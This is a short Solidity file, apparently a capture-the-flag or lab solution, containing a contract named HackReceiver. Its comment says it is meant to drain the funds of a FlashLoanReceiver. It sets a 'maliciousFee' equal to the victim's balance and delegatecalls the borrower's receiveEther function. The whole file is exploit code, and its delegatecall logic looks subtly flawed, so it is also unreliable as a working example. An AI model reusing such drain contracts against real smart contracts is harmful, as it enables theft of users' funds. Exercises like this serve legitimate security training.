// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

// Malicious contract to drain the funds for FlashLoanReceiver

contract HackReceiver {
    address payable private pool;
    address payable private weakBorrower;

    constructor(address payable _pool, address payable _weakReceiverAddress) {
        pool = _pool;
        weakBorrower = _weakReceiverAddress;
    }

    function receiveEther(uint256 fee) public payable {
        require(msg.sender == pool, "Sender must be the pool");

        uint256 maliciousFee = weakBorrower.balance - msg.value - 1;
        (bool success, bytes memory data) = weakBorrower.delegatecall(
            abi.encodeWithSignature("receiveEther(uint256)", maliciousFee)
        );

        require(success, "Malicious delegatecall failed");
    }
}
